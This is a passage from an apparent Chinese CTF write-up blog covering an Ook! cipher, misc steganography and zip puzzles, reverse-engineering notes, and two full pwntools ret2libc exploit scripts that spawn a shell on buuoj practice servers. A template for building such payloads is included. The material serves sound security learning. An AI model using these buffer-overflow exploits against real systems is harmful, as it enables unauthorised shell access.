Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. <br></code></pre></td></tr></table></figure><p>使用<a href="https://www.splitbrain.org/services/ook">brainfuck在线解密</a>网站就可以得到flag：flag{N7F5_AD5_i5_funny!}</p><h1 id="buuoj-荷兰宽带泄露-被偷走的文件-秘密文件"><a href="#buuoj-荷兰宽带泄露-被偷走的文件-秘密文件" class="headerlink" title="buuoj 荷兰宽带泄露 被偷走的文件 秘密文件"></a>buuoj 荷兰宽带泄露 被偷走的文件 秘密文件</h1><h1 id="被刷新的文件"><a href="#被刷新的文件" class="headerlink" title="被刷新的文件"></a>被刷新的文件</h1><h1 id="buuoj-2018-rop"><a href="#buuoj-2018-rop" class="headerlink" title="buuoj 2018_rop"></a>buuoj 2018_rop</h1><p>checksec后发现是32位开启了NX的程序，于是打开ida分析</p><p><img src="https://s2.loli.net/2022/04/29/Go1AmIDPSZXC6VB.png" alt="屏幕截图 2022-04-29 221100"><img src="https://s2.loli.net/2022/04/29/vHigWhpko6eTLJY.png" alt="屏幕截图 2022-04-29 221051"></p><p>典型的ret2libc，于是可以构造payload,同时再巩固下libc模板中的关键位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28791</span>)<br>elf=ELF(<span class="hljs-string">&quot;./2018_rop&quot;</span>)<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr=<span class="hljs-number">0x080484C6</span><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#32位程序：先是write函数的地址 + 预留返回地址 + write函数的三个参数 （1 + write函数的真正地址（got表内的地址） + 打印的字节）</span><br><br>a.send(payload1)<br>write_addr=u32(a.recv())<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<br>libcbase=write_addr-libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<br>sys_addr=libcbase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>bin_sh=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(sys_addr)+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(bin_sh)<br>a.send(payload2)<br>a.interactive()<br></code></pre></td></tr></table></figure><h2 id="补充下retlibc2模板中的关键部分payload构造"><a href="#补充下retlibc2模板中的关键部分payload构造" class="headerlink" title="补充下retlibc2模板中的关键部分payload构造"></a>补充下retlibc2模板中的关键部分payload构造</h2><p>32位：</p><p>​    write函数有三个参数，所以构造payload应该为：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">先是<span class="hljs-built_in">write</span>函数的地址 + 预留返回地址 + <span class="hljs-built_in">write</span>函数的三个参数 （<span class="hljs-number">1</span> + <span class="hljs-built_in">write</span>函数的真正地址（got表内的地址） + 打印的字节）<br></code></pre></td></tr></table></figure><p>64位：</p><ol><li>与32的区别是64位通过寄存器传入参数，同时先传参，所以构造以write为泄露地址的payload应该为</li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">偏移量 + <span class="hljs-built_in">rdi</span>寄存器 + 第一个参数 + <span class="hljs-built_in">rsi</span>寄存器 + 第二个参数 + <span class="hljs-built_in">rdx</span>寄存器 + 第三个参数 + <span class="hljs-built_in">rdx</span>寄存器+write函数的地址 + 预留返回地址<br></code></pre></td></tr></table></figure><ol start="2"><li><p>如果是puts函数只需要一个参数即可（也就是只需要传入rdi一个寄存器）</p></li><li><p>同时64位在接受时尽量采用</p></li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">write_addr = <span class="hljs-built_in">u64</span>(r<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&quot;x7f&quot;</span>)<span class="hljs-selector-attr">[-6:]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;x00&quot;</span>))<br></code></pre></td></tr></table></figure><p>​    因为64位的地址都是7f开头的，如果是用recv(8)的话就会截取前八个字节，而在7f之前还有另外的输出，就会造成错误，而用的是第一种取7f之前的就不会出错，所以以后尽量用第一种，不容易出错。你当然可以用debug调试查看一下。</p><h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>checksec后发现是64位未开启NX的程序，大概猜测是ret2libc</p><p>打开程序看后发现确实是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Pull up your sword and tell me u story!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64</span>uLL);<br>&#125;<br></code></pre></td></tr></table></figure><p>于是可以构造ex</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25906</span>)<br>elf=ELF(<span class="hljs-string">&quot;./bjdctf_2020_babyrop&quot;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>pop_rdi=<span class="hljs-number">0x00400733</span><br>a.recvuntil(<span class="hljs-string">&quot;!\n&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br>a.send(payload1)<br>a.recv()<span class="hljs-comment">#使用puts函数构造payload时需要再吃一个回车！！！</span><br>puts_addr=u64(a.recv(<span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc=LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts_addr)<br>libcbase=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr=libcbase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>bin_addr=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;!\n&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span>+p64(pop_rdi)+p64(bin_addr)+p64(system_addr)<br>a.send(payload2)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>warning：在64位程序中，puts等函数的地址通常为7f开头，如果泄露出来的地址不是很可能是payload错了</p><p>warning2:  在使用puts函数作为泄漏时，记得在接受时需要前面先吃一个回车</p><h1 id="buuoj-misc梅花香自苦寒来"><a href="#buuoj-misc梅花香自苦寒来" class="headerlink" title="buuoj misc梅花香自苦寒来"></a>buuoj misc梅花香自苦寒来</h1><p>打开后发现是图片，用winhex打开发现有很多十六进制数</p><p>在线网站(<a href="https://coding.tools/cn/hex-to-ascii)%E5%90%8E%E5%8F%91%E7%8E%B0%E8%BF%99%E4%BA%9B%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%96%87%E6%9C%AC%E6%98%AF%E7%82%B9%E7%9A%84%E5%9D%90%E6%A0%87">https://coding.tools/cn/hex-to-ascii)后发现这些十六进制文本是点的坐标</a></p><p>将左右括号去除掉后可以用matplotlib+numpy配合使用画出二维码图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>x, y = np.loadtxt(<span class="hljs-string">&#x27;./result.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27;,&#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>plt.plot(x, y, <span class="hljs-string">&#x27;.&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/30/2PZvzoRhMaGrpXy.png" alt="屏幕截图 2022-04-30 160642"></p><h1 id="i春秋春季赛-misc-tiger"><a href="#i春秋春季赛-misc-tiger" class="headerlink" title="i春秋春季赛 misc tiger"></a>i春秋春季赛 misc tiger</h1><p>下载完附件后发现文件有一个图片，一个压缩包和一个提示文件。提示文件内容如下</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-number">1.</span>These are <span class="hljs-keyword">rot</span> <span class="hljs-keyword">for</span> <span class="hljs-number">47</span> days<br><span class="hljs-number">2.</span>Have you heard that lsb steganography also <span class="hljs-keyword">requires</span> a password?<br>ag2a<span class="hljs-string">`f76</span><br></code></pre></td></tr></table></figure><p>根据提示可知是rot47加密<strong>（这里我才疏学浅了，没看出来）</strong>，可以得到密码为：28a217fe</p><p>解压后得到一个key.zip文件和flag.zip的文件，输入后发现每个文件夹里都有相同的informa.txt.txt文件，这里又学到了：<strong>如果两个压缩文件都有相同的文件，就可以采用明文攻击，</strong>（利用ARCHCP)</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDEvMDgvNWMzNDVkZmM2Y2Y3OS5wbmc?x-oss-process=image/format,png" alt="图片"></p><p>得到后会出现一个二维码，扫码后出现flag is not here，可以猜测是零宽字符，于是用在线网站yuanfux.github.io&#x2F;zero-width-web&#x2F;解密零宽字符，得到</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Owl wvn n xhkm <span class="hljs-keyword">SBWav </span>krttqbu gfq gja <span class="hljs-keyword">jhheu </span>up yljycxjpu, vvtx R <span class="hljs-keyword">jzeh </span>pydv usd zp lalhmk, ic <span class="hljs-keyword">brtkac </span>ya whep&#123;<span class="hljs-number">866</span>q3755-t358<span class="hljs-number">-5119</span>-txnr-<span class="hljs-keyword">juw666e8099m&#125;, </span>uroa okv!<br></code></pre></td></tr></table></figure><p>用vigenere解密就可以得到正确的答案</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">You are a good CTFer because you can solve my challenge, next I will give you my secret, my secret <span class="hljs-keyword">is</span> flag&#123;866d3755-c358-<span class="hljs-number">5119</span>-abeb-bda666a8099d&#125;, have <span class="hljs-function"><span class="hljs-keyword">fun</span>!</span><br></code></pre></td></tr></table></figure><h1 id="i春秋春季赛-misc-pintu"><a href="#i春秋春季赛-misc-pintu" class="headerlink" title="i春秋春季赛 misc pintu"></a>i春秋春季赛 misc pintu</h1><p>这道题我之前做过用montage加gaps拼图的题目，以为这道题也可以使用gaps来实现拼图，结果发现是行不通的，看了下答案才知道原来bmp中有可以隐写的地方，并根据此来进行拼图，学到了</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">要先了解下<span class="hljs-keyword">bmp的文件头构造:</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bfType：2字节，文件类型；</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bfSize：4字节，文件大小；</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bfReserved1：2字节，保留，必须设置为0；</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bfReserved2：2字节，保留，必须设置为0；</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bfOffBits：4字节，从头到位图数据的偏移；</span><br></code></pre></td></tr></table></figure><p>所以保留字这里就可以藏信息，打开winhex发现文件在保留字这藏有信息</p><p><img src="https://s2.loli.net/2022/05/11/tmiLu8AXowGSvKy.jpg" alt="209c38f8e146bd1e2ee82696c46441c3.jpg"></p><p>可以猜测拼图是按这个来进行排序的（第六位为x，第八位为y)(os:谁想到的啊！！)</p><p>于是可以上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <span class="hljs-comment">#调用PIL中的Image库</span><br>png=Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(<span class="hljs-number">3840</span>,<span class="hljs-number">2160</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">14400</span>):<br>    file=<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>.bmp&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    x=file[<span class="hljs-number">6</span>]<br>    y=file[<span class="hljs-number">8</span>]<br>    image=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>.bmp&#x27;</span>)<br>    png.paste(image,(x*<span class="hljs-number">32</span>,y*<span class="hljs-number">18</span>))<br>png.save(<span class="hljs-string">&#x27;flag.bmp&#x27;</span>)<br></code></pre></td></tr></table></figure><p>关于PIL库中Image的使用可以参考这个博客地址：<a href="https://blog.csdn.net/dcrmg/article/details/102963336">PIL库中Image的使用</a></p><p>于是就可以得到正确的图片</p><p><img src="https://s2.loli.net/2022/05/11/chye4EH6YJZoivV.jpg" alt="flag1"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单做题记录</title>
    <link href="/2022/04/08/%E7%AE%80%E5%8D%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/04/08/%E7%AE%80%E5%8D%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="xctf-babyre"><a href="#xctf-babyre" class="headerlink" title="xctf babyre"></a>xctf babyre</h1><p>第一次做smc程序，看了wp学了下打patch。</p><p>打开ida启动反汇编就发现judge是全程序的关键，但是judge在开头进行了异或操作，导致反汇编不出来。于是可以用ida打patch来让ida正确反汇编函数。</p><p><img src="https://s2.loli.net/2022/03/06/jfJm9ZKcvklN7AD.png" alt="屏幕截图 2022-03-05 203908"></p><p><img src="https://s2.loli.net/2022/03/06/yIwe5nNEHupZjko.png" alt="屏幕截图 2022-03-05 204106"></p><p>如果是花指令，就可以使用edit-patch programmer将字节码改成nop跳过花指令。如果是需要编写脚本来正确反编译，可以在file-script command里编写脚本(7.5无法直接使用patchbyte()指令，需要from idc_bc695 import *）。</p><p><img src="https://s2.loli.net/2022/03/06/HuGaviSNzsCVOrA.png" alt="屏幕截图 2022-03-05 204927"></p><p>然后再使用快捷键c重新生成汇编代码，发现已经有汇编代码正确生成，再使用快捷键p重新生成函数即可发现关键函数。</p><h1 id="xctf-easyhook"><a href="#xctf-easyhook" class="headerlink" title="xctf easyhook"></a>xctf easyhook</h1><p>打开ida尝试进行静态分析，但因为太多干扰函数和复杂的winapi分析了半小时没分析出来（汗），看了下wp，说用动态调试好解决，于是便进行了动态调试分析。</p><p>先直接让程序运行，直接在提示输入的函数下断点，运行输入后提示错误，说明判断条件在函数内部。进入函数后狂按f8，发现程序在writefile后会入栈一串加密的字符串，于是可以判定程序在此进行判断</p><p><img src="https://s2.loli.net/2022/03/06/PVj1pkTDelZYb3n.png" alt="屏幕截图 2022-03-06 131739"></p><p>我在找加密后的flag这里掉了坑，一直以为后面call401240里给的This_is_not_the_flag是加密后的flag，导致写出的脚本一直得不到flag。后来看了wp才知道原来程序在加密后就直接进行了判断。</p><p><img src="https://s2.loli.net/2022/03/06/yDGY1LH5pItUb8M.png" alt="屏幕截图 2022-03-06 131437"></p><p>最后写出脚本</p><p><img src="https://s2.loli.net/2022/03/06/zXLoJuFdkNMfCI2.png" alt="屏幕截图 2022-03-06 131756"></p><h1 id="xctf-EasyRe"><a href="#xctf-EasyRe" class="headerlink" title="xctf EasyRe"></a>xctf EasyRe</h1><p>打开ida后反编译得到</p><p><img src="https://s2.loli.net/2022/03/06/S3HNRp1jhAU5eMk.png" alt="屏幕截图 2022-03-06 153650"></p><p>程序很简单就简单的异或，于是直接写脚本，但是却得到了反的flag:}NsDkw9sy3qPto4UqNx{galf</p><p><img src="https://s2.loli.net/2022/03/06/c4oD7YL8vx2dkqE.png" alt="屏幕截图 2022-03-06 154358"></p><p>于是开始找原因，后来在汇编代码中发现了问题，原来在汇编代码中，他是从后到前开始异或的，但是在反编译中却没编译出来。以后还是不能全部相信f5反编译。</p><h1 id="xctf-mysterious"><a href="#xctf-mysterious" class="headerlink" title="xctf mysterious"></a>xctf mysterious</h1><p><img src="https://s2.loli.net/2022/03/09/nwK1NJSGxfzhjsF.png" alt="image-20220309163603717"></p><p>打开ida发现是windows程序，打开winmain发现程序运算逻辑，先用getdlgitemtexta api输入内容，然后运用atoi将字符串转换成数字，然后将转换后的数字加一，再将转换后的数字变成字符串，最后拼接输出。这题我卡的地方就在于不知道atoi函数和itoa函数，导致我跟进进去没分析出来www</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs csharp">itoa()函数<br><br>itoa():<span class="hljs-built_in">char</span> *itoa( <span class="hljs-built_in">int</span> <span class="hljs-keyword">value</span>, <span class="hljs-built_in">char</span> *<span class="hljs-built_in">string</span>,<span class="hljs-built_in">int</span> radix);<br><br>原型说明：<br><br><span class="hljs-keyword">value</span>：欲转换的数据。<br><span class="hljs-built_in">string</span>：目标字符串的地址。<br>radix：转换后的进制数，可以是<span class="hljs-number">10</span>进制、<span class="hljs-number">16</span>进制等，范围必须在 <span class="hljs-number">2</span><span class="hljs-number">-36</span>。<br><br>功能：将整数<span class="hljs-keyword">value</span> 转换成字符串存入<span class="hljs-built_in">string</span> 指向的内存空间 ,radix 为转换时所用基数(保存到字符串中的数据的进制基数)。<br>返回值：函数返回一个指向 str，无错误返回。<br></code></pre></td></tr></table></figure><h1 id="xctf-parallel-comparator-200"><a href="#xctf-parallel-comparator-200" class="headerlink" title="xctf parallel-comparator-200"></a>xctf parallel-comparator-200</h1><p>读源码的题</p><p><img src="https://s2.loli.net/2022/03/09/YOZcURWj3C9Es2J.png" alt="屏幕截图 2022-03-09 185426"></p><p>首先题目标准流输入了一个长度为21的字符串，然后对字符串进行了操作，并返回1，接着看字符串处理</p><p><img src="https://s2.loli.net/2022/03/09/n1EfI4bq59hoXGv.png" alt="屏幕截图 2022-03-09 185706"></p><p>先定义了一个随机数，随机数的范围为97-123</p><p><img src="https://s2.loli.net/2022/03/09/2drmO3ZFWlSquUC.png" alt="屏幕截图 2022-03-09 185352"></p><p>后定义了一个二维数组  [] [0]存放随机数，[] [1]存放题目给定的数组，[] [2]存放用户输入的字符串</p><p><img src="https://s2.loli.net/2022/03/09/gkRWBK7xM6uO82P.png" alt="屏幕截图 2022-03-09 185949"></p><p>这串代码意思是checking函数的返回值result必须全部为零，所以接着看checking函数内部</p><p><img src="https://s2.loli.net/2022/03/09/GSuEZMDIfP3VRsX.png" alt="屏幕截图 2022-03-09 185342"></p><p>再异或一次(argument[1]+argument[0])就可以得到flag，因为不知道随机数是多少所以采取暴力手法</p><p>![屏幕截图 2022-03-09 190209](E:\屏幕截图\屏幕截图 2022-03-09 190209.png)</p><p>得到flag:lucky_hacker_you_are</p><h1 id="xctf-testre"><a href="#xctf-testre" class="headerlink" title="xctf testre"></a>xctf testre</h1><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">base64字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<span class="hljs-number">0123456789</span>+/<br>base58字母表：<span class="hljs-number">123456789</span>ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz<br>base32字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ<span class="hljs-number">123456789</span><br>base16字母表：abcdefghijklmnopqrstuvwxyz<span class="hljs-number">123456789</span><br></code></pre></td></tr></table></figure><p>打开后发现两个字母表一个是64一个是58,将字符串用这两个字母表尝试下可以得到flag</p><h1 id="xctf-simple-check"><a href="#xctf-simple-check" class="headerlink" title="xctf simple check"></a>xctf simple check</h1><p>这道题尝试了下gdb调试和od调试,od调试没啥说的。主要是联系linux下的gdb调试。</p> <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">常见的gdb命令符<br><br><span class="hljs-bullet">1.</span> file xxxxx 挂载文件<br><span class="hljs-bullet">2.</span> b xxxx 下断点<br><span class="hljs-bullet">3.</span> n 单步步过<br><span class="hljs-bullet">4.</span> r 运行程序<br><span class="hljs-bullet">5.</span> s 单步步入<br><span class="hljs-bullet">6.</span> quit 退出调试<br></code></pre></td></tr></table></figure><p>题目只要在check函数判断正确就可以输出flag，可以用动态调试将check函数返回的eax值手动改为1，强制判断正确，输出正确的flag。静态调试没分析出来，目前还在看题解的静态调试www</p><h1 id="xctf-easyre-153"><a href="#xctf-easyre-153" class="headerlink" title="xctf easyre-153"></a>xctf easyre-153</h1><p>打开程序找到main函数后，先对程序有个大致了解。</p><p><img src="https://s2.loli.net/2022/03/17/VWqNFBagMf6r8Tt.png" alt="屏幕截图 2022-03-17 194126"></p><p><img src="https://s2.loli.net/2022/03/17/IgPLeS6KjBZGdiH.png" alt="屏幕截图 2022-03-17 194141"></p><p>看到关键函数只有一个printf函数，我猜测应该是程序ida在汇编是发生错误，有可能是题目故意让ida反编译不吹来。找到造成反编译错误点比较困难。</p><p>但看到后面有两个连续的if判断，我最开始想到的方法是使用动态调试跳过这两个判断语句直接的到flag,但实际上在linux使用gdb调试时，我下断点调试时，不知道为啥gdb遇到输入的时候按ctrl+z或者ctrl+j无法结束输入（是我太菜了，悲）。没法结束判断条件就没法跳过后面的两个判断，所以gdb调试只能作罢。又开始了静态分析读代码。</p><p>在查看了lol的汇编代码后，我发现确实是ida没有反汇编出来，于是只好一点一点看汇编。</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 